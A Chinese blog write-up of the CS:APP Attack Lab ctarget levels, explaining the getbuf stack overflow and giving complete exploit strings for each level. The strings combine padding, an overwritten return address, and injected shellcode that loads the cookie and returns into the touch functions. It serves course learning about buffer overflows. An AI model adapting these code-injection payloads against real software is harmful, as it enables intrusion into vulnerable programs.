---
title: attacklab-ctarget
tags:
  - csapp
  - attacklab
categories:
  - csapp
keywords:
  - csapp
  - attacklab
  - 栈溢出
  - 代码注入
  - ctarget
highlight_shrink: false
top_img: https://adguycn990-typoraimage.oss-cn-hangzhou.aliyuncs.com/202211232358703.webp
katex: false
copyright_author: adguy
copyright_author_href: 'https://adguycn990.github.io'
copyright_url: 'https://adguycn990.github.io/adguy/5c165311.html'
copyright_info: 此文章版权归金晖の博客所有，如有转载，请注明来自原作者
abbrlink: 5c165311
date: 2022-11-22 18:32:55
post_copyright:
---


## 简介

`Attack Lab` 的内容针对的是 `CS-APP` 中第三章中关于程序安全性描述中的栈溢出攻击。在这个 `Lab` 中，我们需要针对不同的目的编写攻击字符串来填充一个有漏洞的程序的栈来达到执行攻击代码的目的，攻击方式分为代码注入攻击与返回导向编程攻击。

## 实验目的

{% link 官方文档, https://csapp.cs.cmu.edu/3e/attacklab.pdf, https://csapp.cs.cmu.edu/3e/images/csapp3e-cover.jpg %}

这次实验的文件有点多，一一介绍下。具体东西还得参考cmu给出的实验文档，本实验没有该文档几乎都不知道自己该干什么。

讲义中首先给我们展示了导致程序漏洞的关键：`getbuf` 函数。

```cpp
unsigned getbuf()
{
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

`getbuf` 函数在栈中申请了一块 `BUFFER_SIZE` 大小的空间，然后利用这块空间首地址作为 `Gets` 函数的参数来从标准输入流中读取字符。由于没有对读入字符数量的检查，我们可以通过提供一个超过 `BUFFER_SIZE` 的字符串来向 `getbuf` 的栈帧之外写入数据。

在代码注入攻击中就是利用函数返回时 `RET` 指令会将调用方在栈中存放的返回地址读入 `IP` 中，执行该地址指向的代码。栈溢出后，我们可以改写这个返回地址，指向我们同样存放在栈中的指令，以达到攻击的目的。

## 自我测评

输入命令`./ctarget 字符串 ` 即可测试结果。

一些参数：

- -h: help
- -q: 不向服务器发送结果。由于我们~~大多数~~都没有连到cmu的内网中，所以自然不能上传服务器。测试时这个参数必加
- -i：允许文件作为参数，基本也是必加。

## 使用HEX2RAW

由于向程序提交的答案和平常输入的字符串格式不同，所以需要用到实验文件提供的程序`HEX2RAW`.

`HEX2RAW`expects two-digit hex values separated by one or more white spaces. So if you want to create a byte with a hex value of 0, you need to write it as 00. To create the word 0xdeadbeef you should pass “ef be ad de” to HEX2RAW (note the reversal required for little-endian byte ordering).

```shell
unix> ./hex2raw < exploit.txt > exploit-raw.txt 
unix> ./ctarget -q -i exploit-raw.txt
```

将自己的答案写入`exploit`文件，hex2raw便会将转换格式后的答案重定向到`exploit-raw`文件中，作为参数以便进行评测。

## 生成机器码

需要利用到`GCC`和`OBJDUMP`来生成机器码。

先把写好的汇编文件放到example.s文件中。然后利用`gcc -c`命令将汇编语言翻译成机器码，再 `objdump -d` 生成的文件就可以间接地看到最终的机器码。

实例：文件被放在`example.s`中，输入命令`gcc -c example.s`即可生成可执行文件`example.o`。

再输入命令`objdump -d example.o > example.d`即可看到最终的机器码。格式大抵如下。

```assembly

ans2.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   7:	68 ec 17 40 00       	pushq  $0x4017ec
   c:	c3                   	retq   
```

## Leval1

在这个等级中，我们不需要注入任何攻击代码，只需要更改 `getbuf` 函数的返回地址执行指定的函数 `touch1`（该函数已经存在于程序中）。

那么我们需要做的就是将栈中存放返回地址的位置改为 `touch1` 函数的入口地址，问题在于我们如何将地址精确地写入到原来的地址的位置。

下面我们利用 `objdump -d` 命令将程序反汇编来查看 `getbuf` 函数的行为。

```assembly
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq   
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

代码比较简单，在第 2 行中将 `rsp` 减了 0x28，申请了一块 28 字节的空间，第 3 行将 `rsp` 赋给 `rdi` 就是空间的首地址，然后调用了 `Gets` 函数，`rdi` 就是它的参数。到这里我们可以确定 `BUFFER_SIZE` 的大小为 0x28（自学讲义中这个值是固定的，但是真正的实验中这个值是由服务器生成的）。换句话说，在 0x28 字节的栈被 `Gets` 函数写满之后，多出来的字符会被写入 `getbuf` 函数的栈外。

下面是低地址，上面是高地址，在 `getbuf` 函数申请的 0x28 字节内存之外的 8 个字节存放的就是 `test` 函数 `call` 指令后下一条指令的地址。

现在我们可以知道，我们需要用 0x28 字节来将栈填满，再写入 `touch1` 函数的入口地址，在 `getbuf` 函数执行到 `ret` 指令的时候就会返回到 `touch1` 中执行。

下面就要利用官方提供的 `hex2raw` 程序来帮助我们生成攻击字符串，这个程序将以空白字符隔开表示的字节转换成真正的二进制字节，注意这个程序只是原样地转换文件中的字符，所以字节序的问题是我们应该考虑的。

最终的答案如下：

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
c0 17 40 00 00 00 00 00
```

可以看到前 0x28 个字节都使用 0x00 来填充，然后在溢出的 8 个字节中写入了 `touch1` 的首地址 `0x4017c0`，注意小端的字节序就可以了。

## Leval2

这个等级中我们同样需要跳转到指定的函数 `touch2` 中

```cpp
void touch2(unsigned val) {
    vlevel = 2; /* Part of validation protocol */
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```

这里 `cookie` 是服务器给我们的一个数值，存放在 `cookie.txt` 文件中，自学者材料中的这个值应该都是一样的。

可以看到 `touch2` 拥有一个参数，只有这个参数与 `cookie` 的值相等才可以通过。所以我们的目标就是让程序去执行我们的代码，设置这个参数的值，再调用 `touch2` 完成攻击。

- 如何让程序调用自己的函数呢？利用缓冲区溢出覆盖返回地址
- 自己的函数放哪呢？缓冲区首地址

在为缓存区分配完28个字节后，利用gdb的断点查看此时rsp的地址，这就是缓冲区首地址！把溢出后覆盖的返回地址设置为这个地址。

现在问题是如何调用touch2（不能用callq）。书上有说，函数P调用函数Q时，callq指令会把地址A（返回地址）压入栈中，并将PC设置为Q的起始地址。对应的指令retq会从栈中弹出地址A，并将PC设置为A。

那么把touch2的首地址压入栈中，再调用retq指令即可将PC设置为touch2。

汇编代码就是

```assembly
movq $0x59b997fa, %rdi
pushq $0x4017ec
retq
```

转换成机器码

```
48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3
00 00 00 
00 00 00
00 00 00
00 00 00
00 00 00
00 00 00
00 00 00
00 00 00
00 00 00
78 dc 61 55 00 00 00 00 //溢出后覆盖返回地址
```

## Leval3

```cpp
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval) {
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval) {
    vlevel = 3; /* Part of validation protocol */
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```

和第二题很像，我们要传入一个字符串的首地址，然后这个字符串要和cookie的字符串形式一样。

### 数字转化

首先获得cookie的字符串形式，官方文档中有提到：

{% note info no-icon %}

<ul>
    <li> You will need to include a string representation of your cookie in your exploit string. The string should consist of the eight hexadecimal digits (ordered from most to least significant) without a leading “0x.” </li>
    <li> Recall that a string is represented in C as a sequence of bytes followed by a byte with value 0. Type “man ascii” on any Linux machine to see the byte representations of the characters you need.</li>
</ul>

{% endnote %}

哦，把数字逐位转化成ASCII形式，然后末尾加上 '00' 即可。获取ASCII码的工具就是`man ascii`。最后得到的字符串是：`35 39 62 39 39 37 66 61 00`

### 栈帧结构

理一下思路。

1. 首先利用缓冲区溢出重置返回地址，将返回地址指向攻击代码。
2. 需要在缓冲区找一个地址放置字符串。
3. 攻击代码将rdi寄存器设置为攻击字符串的首地址，并调用touch3函数
4. touch3调用hexmatch函数，把rdi寄存器作为参数传进去，进行字符串匹配

注意hexmatch的这行代码：

`  401850:	48 83 c4 80          	add    $0xffffffffffffff80,%rsp`

在调用hexmatch时，栈指针减小了128。

这里要注意一个地方，字符串所在地址可能被之后调用的touch3函数所覆盖，这会导致调用touch3时与调用hexmatch时，rdi寄存器的值不一样。所以要把字符串放在地址相对更大的地方。

```
48 C7 C7 A8 DC 61 55 68
FA 18 40 00 C3 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
78 DC 61 55 00 00 00 00 
35 39 62 39 39 37 66 61 00
```

直接把攻击字符串放在地址最高的地方，然后就通过了。

